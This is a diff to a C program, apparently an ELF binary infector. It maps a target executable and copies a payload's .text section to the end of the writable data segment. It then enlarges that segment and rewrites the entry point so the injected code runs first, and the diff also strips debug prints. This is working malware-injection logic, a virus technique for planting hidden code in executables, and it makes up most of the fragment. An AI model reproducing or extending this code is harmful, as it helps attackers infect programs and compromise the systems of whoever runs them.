@@ -36,11 +36,9 @@ Elf64_Shdr* find_elf64_sections (uint8_t* data, char* name) {
   for (int i = 0; i < ehdr->e_shnum; i++) {
     sname = (char*)(sh_strtab_p + shdr[i].sh_name);
     if (!strcmp(name, sname)) {
-      printf("Found %s at section %d\n", name, i);
       return &shdr[i];
     }
   }
-  printf("Missing %s\n", name);
   // perror("Cannot find elf section");
   exit(-1);
 }
@@ -52,7 +50,6 @@ Elf64_Phdr* find_data_segment (uint8_t* data) {
   int text_idx;
   for (int i = 0; i < ehdr->e_phnum; i++) {
     if ((phdr[i].p_flags & 6) == 6 && phdr[i].p_type == PT_LOAD) {
-      printf("Data segment found at %d\n", i);
       return &phdr[i];
     }
   }
@@ -82,7 +79,6 @@ int main(int argc, char* argv[]) {
   uint8_t* payload_code;
   Elf64_Shdr* payload_text_shdr = find_elf64_sections(payload_data, ".text");
   payload_size = payload_text_shdr->sh_size;
-  printf("Payload size:  0x%x\n", payload_size);
   payload_code = payload_data + payload_text_shdr->sh_offset;
 
   target_fd = open_map_elf(argv[1], &target_data, payload_size);
@@ -100,6 +96,8 @@ int main(int argc, char* argv[]) {
   int payload_dest_offset = data_seg->p_offset + data_seg->p_filesz; 
   uint8_t* payload_dest = target_data + payload_dest_offset; 
 
+  ehdr->e_entry = data_seg->p_vaddr + data_seg->p_filesz;
+  
   // Adjust data segment.
   data_seg->p_filesz += payload_size;
   data_seg->p_memsz += payload_size;
@@ -122,18 +120,13 @@ int main(int argc, char* argv[]) {
 
   memmove(payload_dest, payload_code, payload_size); 
 
-  // Adjust entry point to point to code cave.
-  printf("\nEntry: %ld Code End: %d\n", ehdr->e_entry, payload_dest_offset);
-  int dist_to_end = payload_dest_offset - ehdr->e_entry;
-  printf("Dist to end %d\n", dist_to_end);
-  ehdr->e_entry = payload_dest_offset + 25;
-
   // Patch relative jump to revert control flow to original entry.
 /*
   short int* place = find_placeholder(code_cave);
   *place = dist_to_end + BACKWARD_JUMP_VALUE;
   printf("Placeholder patched with %hu\n", *place);
 */
+
   close(target_fd);
   close(payload_fd);
 
